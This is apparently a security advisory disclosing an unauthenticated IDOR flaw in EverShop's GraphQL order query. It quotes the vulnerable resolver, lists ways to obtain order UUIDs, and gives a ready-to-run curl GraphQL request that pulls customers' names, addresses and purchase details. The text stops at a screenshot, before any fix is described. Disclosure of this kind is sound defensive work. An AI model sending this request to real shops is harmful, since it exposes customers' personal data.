# Evershop Unauthorized Order Information Access (IDOR)

# Security Advisory: Unauthorized Order Information Access (IDOR)

- **CVE ID:** CVE-2025-XXXX-10
- **Product:** EverShop E-Commerce Platform
- **Vulnerability Type:** Insecure Direct Object Reference (IDOR)
- **Severity:** HIGH
- **CVSS v3.1 Score:** 7.5
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Disclosure Date:** 2025-01-21

---

## Executive Summary

A critical authorization vulnerability has been identified in EverShop's GraphQL API that allows any unauthenticated user to access complete order information, including customer personally identifiable information (PII), shipping addresses, billing details, and purchase history. This is a textbook Insecure Direct Object Reference (IDOR) vulnerability where the application fails to verify whether the requesting user has permission to access the requested order data.

---

## Vulnerability Details

### Description

The `order` GraphQL query resolver accepts an order UUID as input and returns complete order details without performing any authentication or authorization checks. An attacker who obtains or guesses a valid order UUID can retrieve sensitive customer information including:

- Customer full name, email address, and phone number
- Complete shipping address (street, city, province, postal code, country)
- Complete billing address
- Order total amount and payment status
- Detailed list of purchased products with prices
- Shipping and tracking information

### Affected Components

**File:** `/src/modules/oms/graphql/types/Order/Order.resolvers.js` (lines 7-14)

**Vulnerable Code:**

```javascript
Query: {
  order: async (_, { uuid }, { pool }) => {
    const query = getOrdersBaseQuery();
    query.where('uuid', '=', uuid);  // ❌ Only checks if UUID exists
    const order = await query.load(pool);  // ❌ No authorization check
    return order ? camelCase(order) : null;
  }
}
```

**Comparison with Secure Implementation:**

The codebase does contain a secure implementation for customer-owned orders:

```javascript
Customer: {
  orders: async ({ customerId }, _, { pool }) => {
    const orders = await select()
      .from('order')
      .where('order.customer_id', '=', customerId);  // ✅ Validates ownership
    return orders.map((row) => camelCase(row));
  }
}
```

This demonstrates that the developers understand proper authorization, but failed to apply it consistently across all query endpoints.

---

## Attack Vector

### Prerequisites

- **Authentication:** None required
- **Access Level:** Public (unauthenticated users)
- **Complexity:** Low
- **User Interaction:** None

### Attack Steps

**Step 1: Obtain Order UUID**

Order UUIDs can be obtained through various methods:
- Email order confirmation links (e.g., `https://[REDACTED]/order/view/{ORDER_UUID}`)
- Predictable order numbering combined with CVE-2025-XXXX-11
- Information disclosure through error messages
- Social engineering
- Brute force (UUIDs are predictable if using time-based generation)

**Step 2: Query Order Information**

Execute an unauthenticated GraphQL query:

```bash
curl -X POST 'https://[REDACTED]/api/graphql' \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "query GetOrder($uuid: String!) { order(uuid: $uuid) { uuid orderNumber customerEmail customerFullName customerTelephone grandTotal { value } shippingAddress { fullName telephone address1 city province postcode country { name } } billingAddress { fullName telephone address1 } items { productName qty productPrice { value } finalPrice { value } } } }",
    "variables": {
      "uuid": "TARGET_ORDER_UUID"
    }
  }'
```

**Step 3: Receive Sensitive Data**

<img width="941" height="518" alt="image" src="https://github.com/user-attachments/assets/0696e74f-c43d-4cfb-aa30-1e44a42269cc" />
